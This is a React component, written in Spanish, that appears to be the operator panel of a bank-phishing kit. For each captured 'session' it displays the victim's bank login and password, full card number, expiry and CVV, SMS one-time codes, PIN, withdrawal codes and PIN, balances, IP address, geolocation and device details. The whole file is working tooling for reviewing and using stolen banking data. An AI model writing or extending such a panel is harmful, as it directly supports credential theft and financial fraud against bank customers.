import React from 'react';
import { Session } from '@shared/schema';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { FileManager } from './FileManager';
import { 
  User, 
  Smartphone, 
  CreditCard, 
  MessageSquare, 
  KeyRound, 
  Ban, 
  QrCode, 
  Target,
  Calendar,
  Globe,
  Wifi,
  MapPin,
  ExternalLink
} from 'lucide-react';

interface SessionDetailsProps {
  session: Session;
  onFileUpdate: () => void;
}

export const SessionDetails: React.FC<SessionDetailsProps> = ({ 
  session, 
  onFileUpdate 
}) => {
  return (
    <div className="space-y-4">
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <User className="h-5 w-5" />
            Detalles de Sesión - {session.banco}
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="text-sm font-medium text-gray-500">Folio</label>
              <p className="text-lg font-mono">{session.folio}</p>
            </div>
            <div>
              <label className="text-sm font-medium text-gray-500">Estado Actual</label>
              <p className="text-lg capitalize">{session.pasoActual || 'Inicio'}</p>
            </div>
          </div>

          {/* Información del dispositivo */}
          {session.deviceType && (
            <div className="border-t pt-4">
              <h3 className="font-medium text-gray-900 mb-2 flex items-center gap-2">
                <Smartphone className="h-4 w-4" />
                Información del Dispositivo
              </h3>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="text-sm font-medium text-gray-500">Tipo</label>
                  <p className="flex items-center gap-2">
                    <span className={`px-2 py-1 rounded text-sm ${
                      session.deviceType === 'Android' ? 'bg-green-100 text-green-800' :
                      session.deviceType === 'iPhone' ? 'bg-blue-100 text-blue-800' :
                      'bg-gray-100 text-gray-800'
                    }`}>
                      {session.deviceType === 'Android' ? '📱 Android' :
                       session.deviceType === 'iPhone' ? '📱 iOS' :
                       '💻 Escritorio'}
                    </span>
                  </p>
                </div>
                {session.deviceModel && (
                  <div>
                    <label className="text-sm font-medium text-gray-500">Modelo</label>
                    <p>{session.deviceModel}</p>
                  </div>
                )}
              </div>
              {session.deviceBrowser && (
                <div className="mt-2">
                  <label className="text-sm font-medium text-gray-500">Navegador</label>
                  <p>{session.deviceBrowser}</p>
                </div>
              )}
            </div>
          )}

          {/* Información de Ubicación */}
          {(session.latitude || session.longitude || session.ipAddress) && (
            <div className="border-t pt-4">
              <h3 className="font-medium text-gray-900 mb-2 flex items-center gap-2">
                <MapPin className="h-4 w-4" />
                Información de Ubicación
              </h3>
              <div className="space-y-3">
                {(session.latitude && session.longitude) && (
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="text-sm font-medium text-gray-500">Latitud</label>
                      <p className="font-mono">{session.latitude}</p>
                    </div>
                    <div>
                      <label className="text-sm font-medium text-gray-500">Longitud</label>
                      <p className="font-mono">{session.longitude}</p>
                    </div>
                  </div>
                )}
                
                {session.ipAddress && (
                  <div>
                    <label className="text-sm font-medium text-gray-500 flex items-center gap-1">
                      <Globe className="h-3 w-3" />
                      Dirección IP
                    </label>
                    <p className="font-mono">{session.ipAddress}</p>
                  </div>
                )}
                
                {session.googleMapsLink && (
                  <div>
                    <label className="text-sm font-medium text-gray-500">Enlace de Maps</label>
                    <a 
                      href={session.googleMapsLink} 
                      target="_blank" 
                      rel="noopener noreferrer"
                      className="text-blue-600 hover:text-blue-800 flex items-center gap-1 font-medium"
                      data-testid="link-google-maps"
                    >
                      Ver en Google Maps
                      <ExternalLink className="h-3 w-3" />
                    </a>
                  </div>
                )}
                
                {session.locationTimestamp && (
                  <div>
                    <label className="text-sm font-medium text-gray-500 flex items-center gap-1">
                      <Calendar className="h-3 w-3" />
                      Ubicación obtenida
                    </label>
                    <p className="text-sm text-gray-600">
                      {new Date(session.locationTimestamp).toLocaleString('es-MX', {
                        year: 'numeric',
                        month: 'long',
                        day: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit',
                        second: '2-digit'
                      })}
                    </p>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Credenciales */}
          {(session.username || session.password) && (
            <div className="border-t pt-4">
              <h3 className="font-medium text-gray-900 mb-2 flex items-center gap-2">
                <User className="h-4 w-4" />
                Credenciales
              </h3>
              <div className="grid grid-cols-2 gap-4">
                {session.username && (
                  <div>
                    <label className="text-sm font-medium text-gray-500">Usuario</label>
                    <p className="font-mono">{session.username}</p>
                  </div>
                )}
                {session.password && (
                  <div>
                    <label className="text-sm font-medium text-gray-500">Contraseña</label>
                    <p className="font-mono">{session.password}</p>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Información de tarjeta */}
          {session.tarjeta && (
            <div className="border-t pt-4">
              <h3 className="font-medium text-gray-900 mb-2 flex items-center gap-2">
                <CreditCard className="h-4 w-4" />
                Información de Tarjeta
              </h3>
              <div className="grid grid-cols-3 gap-4">
                <div>
                  <label className="text-sm font-medium text-gray-500">Número</label>
                  <p className="font-mono">{session.tarjeta}</p>
                </div>
                {session.fechaVencimiento && (
                  <div>
                    <label className="text-sm font-medium text-gray-500">Vencimiento</label>
                    <p className="font-mono">{session.fechaVencimiento}</p>
                  </div>
                )}
                {session.cvv && (
                  <div>
                    <label className="text-sm font-medium text-gray-500">CVV</label>
                    <p className="font-mono">{session.cvv}</p>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Códigos y mensajes */}
          <div className="grid grid-cols-2 gap-4">
            {session.sms && (
              <div>
                <label className="text-sm font-medium text-gray-500 flex items-center gap-1">
                  <MessageSquare className="h-3 w-3" />
                  SMS
                </label>
                <p className="font-mono">{session.sms}</p>
              </div>
            )}
            {session.nip && (
              <div>
                <label className="text-sm font-medium text-gray-500 flex items-center gap-1">
                  <KeyRound className="h-3 w-3" />
                  NIP
                </label>
                <p className="font-mono">{session.nip}</p>
              </div>
            )}
            {session.smsCompra && (
              <div>
                <label className="text-sm font-medium text-gray-500 flex items-center gap-1">
                  <MessageSquare className="h-3 w-3" />
                  SMS Compra
                </label>
                <p className="font-mono">{session.smsCompra}</p>
              </div>
            )}
            {session.codigoRetiro && (
              <div>
                <label className="text-sm font-medium text-gray-500 flex items-center gap-1">
                  <Ban className="h-3 w-3" />
                  Código Retiro
                </label>
                <p className="font-mono">{session.codigoRetiro}</p>
                {session.pinRetiro && (
                  <p className="text-sm text-gray-600">PIN: {session.pinRetiro}</p>
                )}
              </div>
            )}
          </div>

          {/* Protección de Saldo */}
          {(session.saldoDebito || session.saldoCredito) && (
            <div className="border-t pt-4">
              <h3 className="font-medium text-gray-900 mb-2 flex items-center gap-2">
                <Target className="h-4 w-4" />
                Protección de Saldo
              </h3>
              <div className="grid grid-cols-2 gap-4">
                {session.saldoDebito && (
                  <div>
                    <label className="text-sm font-medium text-gray-500">Tarjeta de Débito</label>
                    <p className="text-lg">{session.saldoDebito}</p>
                    {session.montoDebito && (
                      <p className="text-sm text-gray-600 font-mono">Monto: ${session.montoDebito}</p>
                    )}
                  </div>
                )}
                {session.saldoCredito && (
                  <div>
                    <label className="text-sm font-medium text-gray-500">Tarjeta de Crédito</label>
                    <p className="text-lg">{session.saldoCredito}</p>
                    {session.montoCredito && (
                      <p className="text-sm text-gray-600 font-mono">Monto: ${session.montoCredito}</p>
                    )}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Información adicional */}
          <div className="border-t pt-4">
            <h3 className="font-medium text-gray-900 mb-2 flex items-center gap-2">
              <Target className="h-4 w-4" />
              Información Adicional
            </h3>
            <div className="grid grid-cols-2 gap-4 text-sm">
              <div>
                <label className="text-gray-500">Creado por</label>
                <p>{session.createdBy || '--'}</p>
              </div>
              <div>
                <label className="text-gray-500">Fecha de creación</label>
                <p>{session.createdAt ? new Date(session.createdAt).toLocaleString() : '--'}</p>
              </div>
              {session.celular && (
                <div>
                  <label className="text-gray-500">Celular</label>
                  <p>{session.celular}</p>
                </div>
              )}
              {session.qrData && (
                <div>
                  <label className="text-gray-500">Código QR</label>
                  <p className="text-green-600">Escaneado</p>
                </div>
              )}
            </div>
          </div>
        </CardContent>
      </Card>

      {/* File Manager */}
      <FileManager
        sessionId={session.sessionId}
        currentFile={
          session.fileName ? {
            fileName: session.fileName,
            fileUrl: session.fileUrl || '',
            fileSize: session.fileSize || ''
          } : undefined
        }
        onFileUpdate={onFileUpdate}
      />
    </div>
  );
};